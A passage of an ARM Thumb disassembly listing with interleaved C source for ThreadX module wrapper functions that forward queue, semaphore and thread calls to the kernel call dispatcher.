 8020dac:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020dae:	4618      	mov	r0, r3
 8020db0:	372c      	adds	r7, #44	; 0x2c
 8020db2:	46bd      	mov	sp, r7
 8020db4:	bd90      	pop	{r4, r7, pc}
 8020db6:	bf00      	nop
 8020db8:	00000004 	.word	0x00000004

08020dbc <_txe_queue_prioritize>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_prioritize(TX_QUEUE *queue_ptr)
{
 8020dbc:	b590      	push	{r4, r7, lr}
 8020dbe:	b085      	sub	sp, #20
 8020dc0:	af00      	add	r7, sp, #0
 8020dc2:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_PRIORITIZE_CALL, (ALIGN_TYPE) queue_ptr, 0, 0);
 8020dc4:	4b07      	ldr	r3, [pc, #28]	; (8020de4 <_txe_queue_prioritize+0x28>)
 8020dc6:	f859 3003 	ldr.w	r3, [r9, r3]
 8020dca:	681c      	ldr	r4, [r3, #0]
 8020dcc:	6879      	ldr	r1, [r7, #4]
 8020dce:	2300      	movs	r3, #0
 8020dd0:	2200      	movs	r2, #0
 8020dd2:	2029      	movs	r0, #41	; 0x29
 8020dd4:	47a0      	blx	r4
 8020dd6:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020dd8:	68fb      	ldr	r3, [r7, #12]
}
 8020dda:	4618      	mov	r0, r3
 8020ddc:	3714      	adds	r7, #20
 8020dde:	46bd      	mov	sp, r7
 8020de0:	bd90      	pop	{r4, r7, pc}
 8020de2:	bf00      	nop
 8020de4:	00000004 	.word	0x00000004

08020de8 <_txe_queue_receive>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_receive(TX_QUEUE *queue_ptr, VOID *destination_ptr, ULONG wait_option)
{
 8020de8:	b590      	push	{r4, r7, lr}
 8020dea:	b087      	sub	sp, #28
 8020dec:	af00      	add	r7, sp, #0
 8020dee:	60f8      	str	r0, [r7, #12]
 8020df0:	60b9      	str	r1, [r7, #8]
 8020df2:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_RECEIVE_CALL, (ALIGN_TYPE) queue_ptr, (ALIGN_TYPE) destination_ptr, (ALIGN_TYPE) wait_option);
 8020df4:	4b07      	ldr	r3, [pc, #28]	; (8020e14 <_txe_queue_receive+0x2c>)
 8020df6:	f859 3003 	ldr.w	r3, [r9, r3]
 8020dfa:	681c      	ldr	r4, [r3, #0]
 8020dfc:	68f9      	ldr	r1, [r7, #12]
 8020dfe:	68ba      	ldr	r2, [r7, #8]
 8020e00:	687b      	ldr	r3, [r7, #4]
 8020e02:	202a      	movs	r0, #42	; 0x2a
 8020e04:	47a0      	blx	r4
 8020e06:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8020e08:	697b      	ldr	r3, [r7, #20]
}
 8020e0a:	4618      	mov	r0, r3
 8020e0c:	371c      	adds	r7, #28
 8020e0e:	46bd      	mov	sp, r7
 8020e10:	bd90      	pop	{r4, r7, pc}
 8020e12:	bf00      	nop
 8020e14:	00000004 	.word	0x00000004

08020e18 <_txe_queue_send>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_send(TX_QUEUE *queue_ptr, VOID *source_ptr, ULONG wait_option)
{
 8020e18:	b590      	push	{r4, r7, lr}
 8020e1a:	b087      	sub	sp, #28
 8020e1c:	af00      	add	r7, sp, #0
 8020e1e:	60f8      	str	r0, [r7, #12]
 8020e20:	60b9      	str	r1, [r7, #8]
 8020e22:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_SEND_CALL, (ALIGN_TYPE) queue_ptr, (ALIGN_TYPE) source_ptr, (ALIGN_TYPE) wait_option);
 8020e24:	4b07      	ldr	r3, [pc, #28]	; (8020e44 <_txe_queue_send+0x2c>)
 8020e26:	f859 3003 	ldr.w	r3, [r9, r3]
 8020e2a:	681c      	ldr	r4, [r3, #0]
 8020e2c:	68f9      	ldr	r1, [r7, #12]
 8020e2e:	68ba      	ldr	r2, [r7, #8]
 8020e30:	687b      	ldr	r3, [r7, #4]
 8020e32:	202b      	movs	r0, #43	; 0x2b
 8020e34:	47a0      	blx	r4
 8020e36:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8020e38:	697b      	ldr	r3, [r7, #20]
}
 8020e3a:	4618      	mov	r0, r3
 8020e3c:	371c      	adds	r7, #28
 8020e3e:	46bd      	mov	sp, r7
 8020e40:	bd90      	pop	{r4, r7, pc}
 8020e42:	bf00      	nop
 8020e44:	00000004 	.word	0x00000004

08020e48 <_txe_queue_send_notify>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_send_notify(TX_QUEUE *queue_ptr, VOID (*queue_send_notify)(TX_QUEUE *notify_queue_ptr))
{
 8020e48:	b590      	push	{r4, r7, lr}
 8020e4a:	b085      	sub	sp, #20
 8020e4c:	af00      	add	r7, sp, #0
 8020e4e:	6078      	str	r0, [r7, #4]
 8020e50:	6039      	str	r1, [r7, #0]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_SEND_NOTIFY_CALL, (ALIGN_TYPE) queue_ptr, (ALIGN_TYPE) queue_send_notify, 0);
 8020e52:	4b07      	ldr	r3, [pc, #28]	; (8020e70 <_txe_queue_send_notify+0x28>)
 8020e54:	f859 3003 	ldr.w	r3, [r9, r3]
 8020e58:	681c      	ldr	r4, [r3, #0]
 8020e5a:	6879      	ldr	r1, [r7, #4]
 8020e5c:	683a      	ldr	r2, [r7, #0]
 8020e5e:	2300      	movs	r3, #0
 8020e60:	202c      	movs	r0, #44	; 0x2c
 8020e62:	47a0      	blx	r4
 8020e64:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020e66:	68fb      	ldr	r3, [r7, #12]
}
 8020e68:	4618      	mov	r0, r3
 8020e6a:	3714      	adds	r7, #20
 8020e6c:	46bd      	mov	sp, r7
 8020e6e:	bd90      	pop	{r4, r7, pc}
 8020e70:	00000004 	.word	0x00000004

08020e74 <_txe_semaphore_ceiling_put>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_semaphore_ceiling_put(TX_SEMAPHORE *semaphore_ptr, ULONG ceiling)
{
 8020e74:	b590      	push	{r4, r7, lr}
 8020e76:	b085      	sub	sp, #20
 8020e78:	af00      	add	r7, sp, #0
 8020e7a:	6078      	str	r0, [r7, #4]
 8020e7c:	6039      	str	r1, [r7, #0]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_CEILING_PUT_CALL, (ALIGN_TYPE) semaphore_ptr, (ALIGN_TYPE) ceiling, 0);
 8020e7e:	4b07      	ldr	r3, [pc, #28]	; (8020e9c <_txe_semaphore_ceiling_put+0x28>)
 8020e80:	f859 3003 	ldr.w	r3, [r9, r3]
 8020e84:	681c      	ldr	r4, [r3, #0]
 8020e86:	6879      	ldr	r1, [r7, #4]
 8020e88:	2300      	movs	r3, #0
 8020e8a:	683a      	ldr	r2, [r7, #0]
 8020e8c:	202d      	movs	r0, #45	; 0x2d
 8020e8e:	47a0      	blx	r4
 8020e90:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020e92:	68fb      	ldr	r3, [r7, #12]
}
 8020e94:	4618      	mov	r0, r3
 8020e96:	3714      	adds	r7, #20
 8020e98:	46bd      	mov	sp, r7
 8020e9a:	bd90      	pop	{r4, r7, pc}
 8020e9c:	00000004 	.word	0x00000004

08020ea0 <_txe_semaphore_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_semaphore_create(TX_SEMAPHORE *semaphore_ptr, CHAR *name_ptr, ULONG initial_count, UINT semaphore_control_block_size)
{
 8020ea0:	b590      	push	{r4, r7, lr}
 8020ea2:	b089      	sub	sp, #36	; 0x24
 8020ea4:	af00      	add	r7, sp, #0
 8020ea6:	60f8      	str	r0, [r7, #12]
 8020ea8:	60b9      	str	r1, [r7, #8]
 8020eaa:	607a      	str	r2, [r7, #4]
 8020eac:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[2];

    extra_parameters[0] = (ALIGN_TYPE) initial_count;
 8020eae:	687b      	ldr	r3, [r7, #4]
 8020eb0:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) semaphore_control_block_size;
 8020eb2:	683b      	ldr	r3, [r7, #0]
 8020eb4:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_CREATE_CALL, (ALIGN_TYPE) semaphore_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
 8020eb6:	4b08      	ldr	r3, [pc, #32]	; (8020ed8 <_txe_semaphore_create+0x38>)
 8020eb8:	f859 3003 	ldr.w	r3, [r9, r3]
 8020ebc:	681c      	ldr	r4, [r3, #0]
 8020ebe:	68f9      	ldr	r1, [r7, #12]
 8020ec0:	68ba      	ldr	r2, [r7, #8]
 8020ec2:	f107 0314 	add.w	r3, r7, #20
 8020ec6:	202e      	movs	r0, #46	; 0x2e
 8020ec8:	47a0      	blx	r4
 8020eca:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 8020ecc:	69fb      	ldr	r3, [r7, #28]
}
 8020ece:	4618      	mov	r0, r3
 8020ed0:	3724      	adds	r7, #36	; 0x24
 8020ed2:	46bd      	mov	sp, r7
 8020ed4:	bd90      	pop	{r4, r7, pc}
 8020ed6:	bf00      	nop
 8020ed8:	00000004 	.word	0x00000004

08020edc <_txe_semaphore_delete>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_semaphore_delete(TX_SEMAPHORE *semaphore_ptr)
{
 8020edc:	b590      	push	{r4, r7, lr}
 8020ede:	b085      	sub	sp, #20
 8020ee0:	af00      	add	r7, sp, #0
 8020ee2:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_DELETE_CALL, (ALIGN_TYPE) semaphore_ptr, 0, 0);
 8020ee4:	4b07      	ldr	r3, [pc, #28]	; (8020f04 <_txe_semaphore_delete+0x28>)
 8020ee6:	f859 3003 	ldr.w	r3, [r9, r3]
 8020eea:	681c      	ldr	r4, [r3, #0]
 8020eec:	6879      	ldr	r1, [r7, #4]
 8020eee:	2300      	movs	r3, #0
 8020ef0:	2200      	movs	r2, #0
 8020ef2:	202f      	movs	r0, #47	; 0x2f
 8020ef4:	47a0      	blx	r4
 8020ef6:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020ef8:	68fb      	ldr	r3, [r7, #12]
}
 8020efa:	4618      	mov	r0, r3
 8020efc:	3714      	adds	r7, #20
 8020efe:	46bd      	mov	sp, r7
 8020f00:	bd90      	pop	{r4, r7, pc}
 8020f02:	bf00      	nop
 8020f04:	00000004 	.word	0x00000004

08020f08 <_txe_semaphore_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_semaphore_get(TX_SEMAPHORE *semaphore_ptr, ULONG wait_option)
{
 8020f08:	b590      	push	{r4, r7, lr}
 8020f0a:	b085      	sub	sp, #20
 8020f0c:	af00      	add	r7, sp, #0
 8020f0e:	6078      	str	r0, [r7, #4]
 8020f10:	6039      	str	r1, [r7, #0]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_GET_CALL, (ALIGN_TYPE) semaphore_ptr, (ALIGN_TYPE) wait_option, 0);
 8020f12:	4b07      	ldr	r3, [pc, #28]	; (8020f30 <_txe_semaphore_get+0x28>)
 8020f14:	f859 3003 	ldr.w	r3, [r9, r3]
 8020f18:	681c      	ldr	r4, [r3, #0]
 8020f1a:	6879      	ldr	r1, [r7, #4]
 8020f1c:	2300      	movs	r3, #0
 8020f1e:	683a      	ldr	r2, [r7, #0]
 8020f20:	2030      	movs	r0, #48	; 0x30
 8020f22:	47a0      	blx	r4
 8020f24:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020f26:	68fb      	ldr	r3, [r7, #12]
}
 8020f28:	4618      	mov	r0, r3
 8020f2a:	3714      	adds	r7, #20
 8020f2c:	46bd      	mov	sp, r7
 8020f2e:	bd90      	pop	{r4, r7, pc}
 8020f30:	00000004 	.word	0x00000004

08020f34 <_txe_semaphore_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_semaphore_info_get(TX_SEMAPHORE *semaphore_ptr, CHAR **name, ULONG *current_value, TX_THREAD **first_suspended, ULONG *suspended_count, TX_SEMAPHORE **next_semaphore)
{
 8020f34:	b590      	push	{r4, r7, lr}
 8020f36:	b08b      	sub	sp, #44	; 0x2c
 8020f38:	af00      	add	r7, sp, #0
 8020f3a:	60f8      	str	r0, [r7, #12]
 8020f3c:	60b9      	str	r1, [r7, #8]
 8020f3e:	607a      	str	r2, [r7, #4]
 8020f40:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) current_value;
 8020f42:	687b      	ldr	r3, [r7, #4]
 8020f44:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) first_suspended;
 8020f46:	683b      	ldr	r3, [r7, #0]
 8020f48:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) suspended_count;
 8020f4a:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020f4c:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) next_semaphore;
 8020f4e:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020f50:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_INFO_GET_CALL, (ALIGN_TYPE) semaphore_ptr, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 8020f52:	4b08      	ldr	r3, [pc, #32]	; (8020f74 <_txe_semaphore_info_get+0x40>)
 8020f54:	f859 3003 	ldr.w	r3, [r9, r3]
 8020f58:	681c      	ldr	r4, [r3, #0]
 8020f5a:	68f9      	ldr	r1, [r7, #12]
 8020f5c:	68ba      	ldr	r2, [r7, #8]
 8020f5e:	f107 0314 	add.w	r3, r7, #20
 8020f62:	2031      	movs	r0, #49	; 0x31
 8020f64:	47a0      	blx	r4
 8020f66:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020f68:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020f6a:	4618      	mov	r0, r3
 8020f6c:	372c      	adds	r7, #44	; 0x2c
 8020f6e:	46bd      	mov	sp, r7
 8020f70:	bd90      	pop	{r4, r7, pc}
 8020f72:	bf00      	nop
 8020f74:	00000004 	.word	0x00000004

08020f78 <_tx_semaphore_performance_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_semaphore_performance_info_get(TX_SEMAPHORE *semaphore_ptr, ULONG *puts, ULONG *gets, ULONG *suspensions, ULONG *timeouts)
{
 8020f78:	b590      	push	{r4, r7, lr}
 8020f7a:	b089      	sub	sp, #36	; 0x24
 8020f7c:	af00      	add	r7, sp, #0
 8020f7e:	60f8      	str	r0, [r7, #12]
 8020f80:	60b9      	str	r1, [r7, #8]
 8020f82:	607a      	str	r2, [r7, #4]
 8020f84:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[3];

    extra_parameters[0] = (ALIGN_TYPE) gets;
 8020f86:	687b      	ldr	r3, [r7, #4]
 8020f88:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) suspensions;
 8020f8a:	683b      	ldr	r3, [r7, #0]
 8020f8c:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) timeouts;
 8020f8e:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8020f90:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_PERFORMANCE_INFO_GET_CALL, (ALIGN_TYPE) semaphore_ptr, (ALIGN_TYPE) puts, (ALIGN_TYPE) extra_parameters);
 8020f92:	4b08      	ldr	r3, [pc, #32]	; (8020fb4 <_tx_semaphore_performance_info_get+0x3c>)
 8020f94:	f859 3003 	ldr.w	r3, [r9, r3]
 8020f98:	681c      	ldr	r4, [r3, #0]
 8020f9a:	68f9      	ldr	r1, [r7, #12]
 8020f9c:	68ba      	ldr	r2, [r7, #8]
 8020f9e:	f107 0310 	add.w	r3, r7, #16
 8020fa2:	2032      	movs	r0, #50	; 0x32
 8020fa4:	47a0      	blx	r4
 8020fa6:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 8020fa8:	69fb      	ldr	r3, [r7, #28]
}
 8020faa:	4618      	mov	r0, r3
 8020fac:	3724      	adds	r7, #36	; 0x24
 8020fae:	46bd      	mov	sp, r7
 8020fb0:	bd90      	pop	{r4, r7, pc}
 8020fb2:	bf00      	nop
 8020fb4:	00000004 	.word	0x00000004

08020fb8 <_tx_semaphore_performance_system_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_semaphore_performance_system_info_get(ULONG *puts, ULONG *gets, ULONG *suspensions, ULONG *timeouts)
{
 8020fb8:	b590      	push	{r4, r7, lr}
 8020fba:	b089      	sub	sp, #36	; 0x24
 8020fbc:	af00      	add	r7, sp, #0
 8020fbe:	60f8      	str	r0, [r7, #12]
 8020fc0:	60b9      	str	r1, [r7, #8]
 8020fc2:	607a      	str	r2, [r7, #4]
 8020fc4:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[2];

    extra_parameters[0] = (ALIGN_TYPE) suspensions;
 8020fc6:	687b      	ldr	r3, [r7, #4]
 8020fc8:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) timeouts;
 8020fca:	683b      	ldr	r3, [r7, #0]
 8020fcc:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_PERFORMANCE_SYSTEM_INFO_GET_CALL, (ALIGN_TYPE) puts, (ALIGN_TYPE) gets, (ALIGN_TYPE) extra_parameters);
 8020fce:	4b08      	ldr	r3, [pc, #32]	; (8020ff0 <_tx_semaphore_performance_system_info_get+0x38>)
 8020fd0:	f859 3003 	ldr.w	r3, [r9, r3]
 8020fd4:	681c      	ldr	r4, [r3, #0]
 8020fd6:	68f9      	ldr	r1, [r7, #12]
 8020fd8:	68ba      	ldr	r2, [r7, #8]
 8020fda:	f107 0314 	add.w	r3, r7, #20
 8020fde:	2033      	movs	r0, #51	; 0x33
 8020fe0:	47a0      	blx	r4
 8020fe2:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 8020fe4:	69fb      	ldr	r3, [r7, #28]
}
 8020fe6:	4618      	mov	r0, r3
 8020fe8:	3724      	adds	r7, #36	; 0x24
 8020fea:	46bd      	mov	sp, r7
 8020fec:	bd90      	pop	{r4, r7, pc}
 8020fee:	bf00      	nop
 8020ff0:	00000004 	.word	0x00000004

08020ff4 <_txe_semaphore_prioritize>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_semaphore_prioritize(TX_SEMAPHORE *semaphore_ptr)
{
 8020ff4:	b590      	push	{r4, r7, lr}
 8020ff6:	b085      	sub	sp, #20
 8020ff8:	af00      	add	r7, sp, #0
 8020ffa:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_PRIORITIZE_CALL, (ALIGN_TYPE) semaphore_ptr, 0, 0);
 8020ffc:	4b07      	ldr	r3, [pc, #28]	; (802101c <_txe_semaphore_prioritize+0x28>)
 8020ffe:	f859 3003 	ldr.w	r3, [r9, r3]
 8021002:	681c      	ldr	r4, [r3, #0]
 8021004:	6879      	ldr	r1, [r7, #4]
 8021006:	2300      	movs	r3, #0
 8021008:	2200      	movs	r2, #0
 802100a:	2034      	movs	r0, #52	; 0x34
 802100c:	47a0      	blx	r4
 802100e:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021010:	68fb      	ldr	r3, [r7, #12]
}
 8021012:	4618      	mov	r0, r3
 8021014:	3714      	adds	r7, #20
 8021016:	46bd      	mov	sp, r7
 8021018:	bd90      	pop	{r4, r7, pc}
 802101a:	bf00      	nop
 802101c:	00000004 	.word	0x00000004

08021020 <_txe_semaphore_put>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_semaphore_put(TX_SEMAPHORE *semaphore_ptr)
{
 8021020:	b590      	push	{r4, r7, lr}
 8021022:	b085      	sub	sp, #20
 8021024:	af00      	add	r7, sp, #0
 8021026:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_PUT_CALL, (ALIGN_TYPE) semaphore_ptr, 0, 0);
 8021028:	4b07      	ldr	r3, [pc, #28]	; (8021048 <_txe_semaphore_put+0x28>)
 802102a:	f859 3003 	ldr.w	r3, [r9, r3]
 802102e:	681c      	ldr	r4, [r3, #0]
 8021030:	6879      	ldr	r1, [r7, #4]
 8021032:	2300      	movs	r3, #0
 8021034:	2200      	movs	r2, #0
 8021036:	2035      	movs	r0, #53	; 0x35
 8021038:	47a0      	blx	r4
 802103a:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 802103c:	68fb      	ldr	r3, [r7, #12]
}
 802103e:	4618      	mov	r0, r3
 8021040:	3714      	adds	r7, #20
 8021042:	46bd      	mov	sp, r7
 8021044:	bd90      	pop	{r4, r7, pc}
 8021046:	bf00      	nop
 8021048:	00000004 	.word	0x00000004

0802104c <_txe_semaphore_put_notify>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_semaphore_put_notify(TX_SEMAPHORE *semaphore_ptr, VOID (*semaphore_put_notify)(TX_SEMAPHORE *notify_semaphore_ptr))
{
 802104c:	b590      	push	{r4, r7, lr}
 802104e:	b085      	sub	sp, #20
 8021050:	af00      	add	r7, sp, #0
 8021052:	6078      	str	r0, [r7, #4]
 8021054:	6039      	str	r1, [r7, #0]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_PUT_NOTIFY_CALL, (ALIGN_TYPE) semaphore_ptr, (ALIGN_TYPE) semaphore_put_notify, 0);
 8021056:	4b07      	ldr	r3, [pc, #28]	; (8021074 <_txe_semaphore_put_notify+0x28>)
 8021058:	f859 3003 	ldr.w	r3, [r9, r3]
 802105c:	681c      	ldr	r4, [r3, #0]
 802105e:	6879      	ldr	r1, [r7, #4]
 8021060:	683a      	ldr	r2, [r7, #0]
 8021062:	2300      	movs	r3, #0
 8021064:	2036      	movs	r0, #54	; 0x36
 8021066:	47a0      	blx	r4
 8021068:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 802106a:	68fb      	ldr	r3, [r7, #12]
}
 802106c:	4618      	mov	r0, r3
 802106e:	3714      	adds	r7, #20
 8021070:	46bd      	mov	sp, r7
 8021072:	bd90      	pop	{r4, r7, pc}
 8021074:	00000004 	.word	0x00000004

08021078 <_txe_thread_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_create(TX_THREAD *thread_ptr, CHAR *name_ptr, VOID (*entry_function)(ULONG entry_input), ULONG entry_input, VOID *stack_start, ULONG stack_size, UINT priority, UINT preempt_threshold, ULONG time_slice, UINT auto_start, UINT thread_control_block_size)
{
 8021078:	b590      	push	{r4, r7, lr}
 802107a:	b08f      	sub	sp, #60	; 0x3c
 802107c:	af00      	add	r7, sp, #0
 802107e:	60f8      	str	r0, [r7, #12]
 8021080:	60b9      	str	r1, [r7, #8]
 8021082:	607a      	str	r2, [r7, #4]
 8021084:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[9];

    extra_parameters[0] = (ALIGN_TYPE) entry_function;
 8021086:	687b      	ldr	r3, [r7, #4]
 8021088:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) entry_input;
 802108a:	683b      	ldr	r3, [r7, #0]
 802108c:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) stack_start;
 802108e:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8021090:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) stack_size;
 8021092:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8021094:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) priority;
 8021096:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8021098:	623b      	str	r3, [r7, #32]
    extra_parameters[5] = (ALIGN_TYPE) preempt_threshold;
 802109a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 802109c:	627b      	str	r3, [r7, #36]	; 0x24
    extra_parameters[6] = (ALIGN_TYPE) time_slice;
 802109e:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80210a0:	62bb      	str	r3, [r7, #40]	; 0x28
    extra_parameters[7] = (ALIGN_TYPE) auto_start;
 80210a2:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80210a4:	62fb      	str	r3, [r7, #44]	; 0x2c
    extra_parameters[8] = (ALIGN_TYPE) thread_control_block_size;
 80210a6:	6e3b      	ldr	r3, [r7, #96]	; 0x60
 80210a8:	633b      	str	r3, [r7, #48]	; 0x30

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_CREATE_CALL, (ALIGN_TYPE) thread_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
 80210aa:	4b08      	ldr	r3, [pc, #32]	; (80210cc <_txe_thread_create+0x54>)
 80210ac:	f859 3003 	ldr.w	r3, [r9, r3]
 80210b0:	681c      	ldr	r4, [r3, #0]
 80210b2:	68f9      	ldr	r1, [r7, #12]
 80210b4:	68ba      	ldr	r2, [r7, #8]
 80210b6:	f107 0310 	add.w	r3, r7, #16
 80210ba:	2037      	movs	r0, #55	; 0x37
 80210bc:	47a0      	blx	r4
 80210be:	6378      	str	r0, [r7, #52]	; 0x34

    /* Return value to the caller.  */
    return(return_value);
 80210c0:	6b7b      	ldr	r3, [r7, #52]	; 0x34
}
 80210c2:	4618      	mov	r0, r3
 80210c4:	373c      	adds	r7, #60	; 0x3c
 80210c6:	46bd      	mov	sp, r7
 80210c8:	bd90      	pop	{r4, r7, pc}
 80210ca:	bf00      	nop
 80210cc:	00000004 	.word	0x00000004

080210d0 <_txe_thread_delete>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_delete(TX_THREAD *thread_ptr)
{
 80210d0:	b590      	push	{r4, r7, lr}
 80210d2:	b085      	sub	sp, #20
 80210d4:	af00      	add	r7, sp, #0
 80210d6:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_DELETE_CALL, (ALIGN_TYPE) thread_ptr, 0, 0);
 80210d8:	4b07      	ldr	r3, [pc, #28]	; (80210f8 <_txe_thread_delete+0x28>)
 80210da:	f859 3003 	ldr.w	r3, [r9, r3]
 80210de:	681c      	ldr	r4, [r3, #0]
 80210e0:	6879      	ldr	r1, [r7, #4]
 80210e2:	2300      	movs	r3, #0
 80210e4:	2200      	movs	r2, #0
 80210e6:	2038      	movs	r0, #56	; 0x38
 80210e8:	47a0      	blx	r4
 80210ea:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80210ec:	68fb      	ldr	r3, [r7, #12]
}
